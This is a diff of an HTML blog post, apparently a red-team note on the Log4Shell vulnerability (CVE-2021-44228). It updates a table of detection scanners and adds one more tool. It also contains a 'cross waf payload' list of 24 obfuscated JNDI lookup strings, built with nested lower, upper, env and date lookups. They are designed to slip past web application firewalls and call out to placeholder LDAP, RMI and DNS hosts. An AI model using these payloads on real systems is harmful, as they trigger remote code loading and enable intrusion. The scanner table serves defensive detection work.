@@ -112,7 +112,7 @@
 <meta property="og:locale">
 <meta property="og:image" content="https://s2.loli.net/2021/12/21/yCrZcNFMiIOz79S.png">
 <meta property="article:published_time" content="2021-12-21T04:11:11.000Z">
-<meta property="article:modified_time" content="2021-12-20T16:19:24.104Z">
+<meta property="article:modified_time" content="2021-12-22T16:07:12.451Z">
 <meta property="article:author" content="sunyyer">
 <meta property="article:tag" content="Red Team">
 <meta property="article:tag" content="payload">
@@ -422,40 +422,46 @@
 </tr>
 </thead>
 <tbody><tr>
-<td><a target="_blank" rel="noopener" href="https://note.youdao.com/">https://github.com/logpresso/CVE-2021-44228-Scanner</a></td>
+<td><code>https://github.com/logpresso/CVE-2021-44228-Scanner</code></td>
 <td>github</td>
 <td>log4j2j-scan</td>
 <td>script</td>
 </tr>
 <tr>
-<td><a target="_blank" rel="noopener" href="https://note.youdao.com/">https://log4j2-detector.chaitin.cn/</a></td>
+<td><code>https://log4j2-detector.chaitin.cn/ </code></td>
 <td>chaitin/长亭</td>
-<td>log4j2_local_scanner_linux_amd64.v3</td>
+<td>log4j2_local_scanner_linux</td>
 <td>script</td>
 </tr>
 <tr>
-<td></td>
-<td><a target="_blank" rel="noopener" href="https://note.youdao.com/">https://github.com/fullhunt/log4j-scan</a></td>
+<td><code>https://github.com/fullhunt/log4j-scan</code></td>
 <td>github</td>
 <td>logej-scan</td>
+<td>python</td>
 </tr>
 <tr>
-<td></td>
-<td><a target="_blank" rel="noopener" href="https://github.com/Neo23x0/log4shell-detector">https://github.com/Neo23x0/log4shell-detector</a></td>
+<td><code>https://github.com/Neo23x0/log4shell-detector</code></td>
 <td>github</td>
 <td>log4shell-detector</td>
+<td>python</td>
 </tr>
 <tr>
-<td></td>
 <td><a target="_blank" rel="noopener" href="https://github.com/webraybtl/Log4j">https://github.com/webraybtl/Log4j</a></td>
 <td>github/webray</td>
 <td>log4j2_detect2.0</td>
+<td>script</td>
 </tr>
 <tr>
-<td></td>
-<td><a target="_blank" rel="noopener" href="https://yunpan.360.cn/surl_ykykpBsDYeH">https://yunpan.360.cn/surl_ykykpBsDYeH</a></td>
+<td><code>https://yunpan.360.cn/surl_ykykpBsDYeH</code></td>
 <td>360</td>
 <td>log4j-discoverer</td>
+<td>script</td>
+</tr>
+<tr>
+<td><code>https://github.com/fox-it/log4j-finder</code></td>
+<td>fox-it</td>
+<td>log4j-finder</td>
+<td>base JDNI class detect</td>
 </tr>
 </tbody></table>
 <p>log4j2-scan</p>
@@ -463,6 +469,7 @@
 <p>log4shell-detector</p>
 <p>log4j2_detect2.0</p>
 <p>log4j-discoverer</p>
+<p>log4j-finder</p>
 <h1 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h1><p><strong>==cross waf payload==</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://domain.com/j&#125;</span><br><span class="line">$&#123;jndi:ldap:/domain.com/a&#125;</span><br><span class="line">$&#123;jndi:dns:/domain.com&#125;</span><br><span class="line">$&#123;jndi:dns://domain.com/j&#125;</span><br><span class="line">$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-r&#125;$&#123;::-m&#125;$&#123;::-i&#125;://domain.com/j&#125;</span><br><span class="line">$&#123;$&#123;::-j&#125;ndi:rmi://domain.com/j&#125;</span><br><span class="line">$&#123;jndi:rmi://domainldap.com/j&#125;</span><br><span class="line">$&#123;$&#123;lower:jndi&#125;:$&#123;lower:rmi&#125;://domain.com/j&#125;</span><br><span class="line">$&#123;$&#123;lower:$&#123;lower:jndi&#125;&#125;:$&#123;lower:rmi&#125;://domain.com/j&#125;</span><br><span class="line">$&#123;$&#123;lower:j&#125;$&#123;lower:n&#125;$&#123;lower:d&#125;i:$&#123;lower:rmi&#125;://domain.com/j&#125;</span><br><span class="line">$&#123;$&#123;lower:j&#125;$&#123;upper:n&#125;$&#123;lower:d&#125;$&#123;upper:i&#125;:$&#123;lower:r&#125;m$&#123;lower:i&#125;&#125;://domain.com/j&#125;</span><br><span class="line">$&#123;jndi:$&#123;lower:l&#125;$&#123;lower:d&#125;a$&#123;lower:p&#125;://domain.com&#125;</span><br><span class="line">$&#123;$&#123;env:NaN:-j&#125;ndi$&#123;env:NaN:-:&#125;$&#123;env:NaN:-l&#125;dap$&#123;env:NaN:-:&#125;//domain.com/a&#125;</span><br><span class="line">jn$&#123;env::-&#125;di:</span><br><span class="line">jn$&#123;date:&#125;di$&#123;date:&#x27;:&#x27;&#125;</span><br><span class="line">j$&#123;k8s:k5:-ND&#125;i$&#123;sd:k5:-:&#125;</span><br><span class="line">j$&#123;main:\k5:-Nd&#125;i$&#123;spring:k5:-:&#125;</span><br><span class="line">j$&#123;sys:k5:-nD&#125;$&#123;lower:i$&#123;web:k5:-:&#125;&#125;</span><br><span class="line">j$&#123;::-nD&#125;i$&#123;::-:&#125;</span><br><span class="line">j$&#123;EnV:K5:-nD&#125;i:</span><br><span class="line">j$&#123;loWer:Nd&#125;i$&#123;uPper::&#125;</span><br><span class="line">$&#123;$&#123;env:ENV_NAME:-j&#125;ndi$&#123;env:ENV_NAME:-:&#125;$&#123;env:ENV_NAME:-l&#125;dap$&#123;env:ENV_NAME:-:&#125;//domain.com/z&#125;</span><br><span class="line">$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-l&#125;$&#123;::-d&#125;$&#123;::-a&#125;$&#123;::-p&#125;://domin.com/z&#125;</span><br><span class="line">$&#123;j$&#123;$&#123;:-l&#125;$&#123;:-o&#125;$&#123;:-w&#125;$&#123;:-e&#125;$&#123;:-r&#125;:n&#125;di:ldap://somesitehackerofhell.com/z&#125;</span><br></pre></td></tr></table></figure>
 
